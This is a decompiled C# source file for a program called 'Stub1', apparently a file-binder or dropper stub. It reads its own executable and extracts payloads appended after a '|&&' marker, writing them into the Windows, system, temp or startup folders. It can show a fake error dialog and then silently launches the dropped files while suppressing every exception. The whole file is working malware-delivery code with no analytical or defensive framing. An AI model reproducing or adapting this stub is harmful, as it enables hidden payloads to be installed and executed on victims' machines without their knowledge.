using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Windows.Forms;

namespace Stub1;

internal static class Program
{
	[STAThread]
	private static void Main()
	{
		//IL_0102: Unknown result type (might be due to invalid IL or missing references)
		StreamReader streamReader = new StreamReader(Application.get_ExecutablePath());
		BinaryReader binaryReader = new BinaryReader(streamReader.BaseStream);
		byte[] array = binaryReader.ReadBytes(Convert.ToInt32(streamReader.BaseStream.Length));
		binaryReader.Close();
		streamReader.Close();
		ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
		string @string = aSCIIEncoding.GetString(array);
		string text = @string.Substring(@string.LastIndexOf("|&&"));
		char[] separator = new char[1] { '#' };
		char[] separator2 = new char[1] { '|' };
		string[] array2 = text.Split(separator);
		int num = 0;
		int num2 = 0;
		int num3 = 0;
		string[] array3 = array2;
		foreach (string text2 in array3)
		{
			string[] array4 = text2.Replace("|&&", null).Split(separator2);
			if (num == 0)
			{
				num2 = Convert.ToInt32(array4[0]);
				num3 = num2;
				if (array4[1] != "False")
				{
					MessageBox.Show(array4[1], "Error!", (MessageBoxButtons)0, (MessageBoxIcon)16);
				}
			}
			else
			{
				int num4 = 0;
				string text3 = "C:\\";
				string text4 = "none";
				bool flag = false;
				try
				{
					num4 = Convert.ToInt32(array4[0]);
					text3 = array4[1];
					flag = Convert.ToBoolean(array4[2]);
					text4 = array4[3];
					switch (text3)
					{
					case "win":
						text3 = Environment.GetEnvironmentVariable("windir") + "\\" + text4;
						break;
					case "temp":
						text3 = Environment.GetEnvironmentVariable("TEMP") + "\\" + text4;
						break;
					case "sys":
						text3 = Environment.SystemDirectory + "\\" + text4;
						break;
					case "app":
						text3 = Application.get_StartupPath() + "\\" + text4;
						break;
					}
					StreamWriter streamWriter = new StreamWriter(text3);
					streamWriter.BaseStream.Write(array, num3, num4);
					streamWriter.Close();
					if (flag)
					{
						Process.Start(text3);
					}
					num3 += num4;
				}
				catch
				{
				}
			}
			num++;
		}
	}
}
